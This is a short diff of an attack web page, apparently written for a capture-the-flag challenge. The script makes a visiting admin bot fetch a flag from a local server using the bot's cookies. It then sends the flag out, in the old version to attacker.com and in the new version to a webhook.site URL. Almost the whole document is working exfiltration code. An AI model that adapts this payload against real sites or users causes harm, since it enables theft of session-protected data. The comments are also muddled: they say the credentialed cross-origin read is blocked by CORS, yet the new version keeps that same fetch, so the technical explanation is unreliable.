@@ -1,12 +1,12 @@
-<!-- hosted at attacker.com/pwn.html -->
 <script>
-  // 1. Fetch flag from local server (bot has admin session)
-  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
-    .then(res => res.json())      // This cross-origin read WILL be blocked by CORS
-    .then(data => exfil(data.flag))
-    .catch(e => console.log(e));
+  // Bot lands here. Its cookies are for 127.0.0.1:5000
+  // We navigate it to the flag endpoint (same origin for the bot = cookies sent)
+  // Then redirect to our server with the flag
 
-  function exfil(flag) {
-    document.location = 'https://attacker.com/got?f=' + encodeURIComponent(flag);
-  }
+  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
+    .then(r => r.json())
+    .then(data => {
+      // Exfil: navigate the bot to your server with flag in URL
+      window.location = 'https://webhook.site/YOUR-ID?flag=' + encodeURIComponent(data.flag);
+    });
 </script>
